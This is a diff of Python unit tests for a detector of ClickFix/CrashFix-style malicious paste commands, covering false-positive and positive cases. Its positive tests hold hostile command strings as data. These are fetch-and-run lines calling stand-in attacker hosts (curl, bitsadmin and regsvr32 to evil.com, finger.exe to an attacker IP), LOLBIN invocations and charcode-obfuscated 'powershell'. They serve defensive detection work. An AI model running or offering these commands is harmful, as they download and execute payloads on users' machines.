@@ -58,6 +58,47 @@ class TestClean(unittest.TestCase):
     def test_plain_text_base64_mention(self):
         self.assertIsNone(check_for_suspicious_content("The base64 encoding scheme is used to encode binary data"))
 
+    def test_bare_finger_word(self):
+        # "finger" alone is a common English word — must not trigger
+        self.assertIsNone(check_for_suspicious_content("point your finger at the screen"))
+
+    def test_bare_finger_exe_alone(self):
+        # finger.exe without user@host target is only medium — needs a second signal
+        self.assertIsNone(check_for_suspicious_content("finger.exe"))
+
+    def test_bare_wscript_alone(self):
+        self.assertIsNone(check_for_suspicious_content("wscript"))
+
+    def test_bare_rundll32_alone(self):
+        self.assertIsNone(check_for_suspicious_content("rundll32"))
+
+    def test_single_char_cast(self):
+        # A single [char] cast alone is only medium — needs a second signal
+        self.assertIsNone(check_for_suspicious_content("To use character codes: [char]65 equals 'A'"))
+
+    def test_short_numeric_list(self):
+        # Fewer than 10 comma-separated numbers should NOT trigger
+        self.assertIsNone(check_for_suspicious_content("1, 2, 3, 4, 5"))
+
+    def test_bare_cmd_c_alone(self):
+        # cmd /c alone is medium — needs a second signal to trigger
+        self.assertIsNone(check_for_suspicious_content("cmd /c"))
+
+    def test_cmd_exe_only(self):
+        # cmd.exe without /c should not trigger
+        self.assertIsNone(check_for_suspicious_content("cmd.exe"))
+
+    def test_bare_cscript_alone(self):
+        self.assertIsNone(check_for_suspicious_content("cscript"))
+
+    def test_bare_regsvr32_alone(self):
+        self.assertIsNone(check_for_suspicious_content("regsvr32"))
+
+    def test_numeric_blob_alone(self):
+        # 10+ comma-separated numbers without any other signal should NOT trigger
+        blob = ",".join(str(i) for i in range(100, 115))
+        self.assertIsNone(check_for_suspicious_content(blob))
+
 
 class TestSuspicious(unittest.TestCase):
     """Content that SHOULD trigger a warning."""
@@ -192,6 +233,98 @@ class TestRealisticPayloads(unittest.TestCase):
     def test_two_payload_urls_mixed_extensions(self):
         self.assertIsNotNone(check_for_suspicious_content(
             "Step 1: https://setup.evil.com/bootstrap.sh Step 2: https://cdn.evil.com/agent.ps1"
+        ))
+
+
+class TestCrashFixDetection(unittest.TestCase):
+    """CrashFix ClickFix variant — finger.exe LOLBIN and charcode obfuscation (issue #17)."""
+
+    # --- cmd /c and cmd.exe /c ---
+
+    def test_cmd_c_with_payload_url(self):
+        # cmd /c (medium) + .ps1 URL (medium) = trigger
+        self.assertIsNotNone(check_for_suspicious_content(
+            "cmd /c curl https://evil.com/setup.ps1"
+        ))
+
+    def test_cmd_exe_slash_c(self):
+        # cmd.exe /c should also be detected (medium)
+        self.assertIsNotNone(check_for_suspicious_content(
+            "cmd.exe /c bitsadmin /transfer job http://evil.com/evil.exe"
+        ))
+
+    # --- finger.exe LOLBIN ---
+
+    def test_finger_exe_with_user_at_host(self):
+        # CrashFix: finger.exe used to fetch payload from attacker IP
+        self.assertIsNotNone(check_for_suspicious_content(
+            "cmd /c start finger.exe attacker@69.67.173.30"
+        ))
+
+    def test_finger_bare_with_user_at_host(self):
+        # finger (without .exe) with user@host is also high confidence
+        self.assertIsNotNone(check_for_suspicious_content(
+            "finger attacker@evil.com"
+        ))
+
+    def test_finger_exe_bare_plus_payload_url(self):
+        # finger.exe (medium) + payload URL (medium) = should trigger
+        self.assertIsNotNone(check_for_suspicious_content(
+            "finger.exe && https://evil.com/script.ps1"
+        ))
+
+    def test_finger_exe_plus_cmd_c(self):
+        # finger.exe (medium) + cmd /c (medium) = trigger
+        self.assertIsNotNone(check_for_suspicious_content(
+            "cmd /c finger.exe"
+        ))
+
+    # --- Broader LOLBINs ---
+
+    def test_rundll32_with_flag(self):
+        self.assertIsNotNone(check_for_suspicious_content(
+            "rundll32.exe /SHELLEX,ShellExec_RunDLL cmd.exe"
+        ))
+
+    def test_regsvr32_with_url(self):
+        self.assertIsNotNone(check_for_suspicious_content(
+            "regsvr32 /i:http://evil.com/payload.sct scrobj.dll"
+        ))
+
+    def test_wscript_with_flag(self):
+        self.assertIsNotNone(check_for_suspicious_content(
+            "wscript.exe /e:jscript payload.txt"
+        ))
+
+    def test_cscript_with_flag(self):
+        self.assertIsNotNone(check_for_suspicious_content(
+            "cscript //nologo malicious.vbs"
+        ))
+
+    def test_two_bare_lolbins(self):
+        # Two bare LOLBIN mentions together accumulate to 2 medium signals
+        self.assertIsNotNone(check_for_suspicious_content(
+            "wscript and rundll32 are Windows scripting hosts"
+        ))
+
+    # --- Charcode obfuscation ---
+
+    def test_powershell_char_chain(self):
+        # PowerShell [char] casting chain for "powershell"
+        self.assertIsNotNone(check_for_suspicious_content(
+            "[char]112+[char]111+[char]119+[char]101+[char]114+[char]115+[char]104+[char]101+[char]108+[char]108"
+        ))
+
+    def test_string_from_char_code_with_numeric_blob(self):
+        self.assertIsNotNone(check_for_suspicious_content(
+            "String.fromCharCode(112,111,119,101,114,115,104,101,108,108,46,101,120,101)"
+        ))
+
+    def test_large_numeric_blob(self):
+        # 10+ comma-separated numbers (medium) + a second medium signal to trigger
+        blob = ",".join(str(i) for i in range(100, 115))  # 15 values
+        self.assertIsNotNone(check_for_suspicious_content(
+            f"powershell {blob}"
         ))
 
 
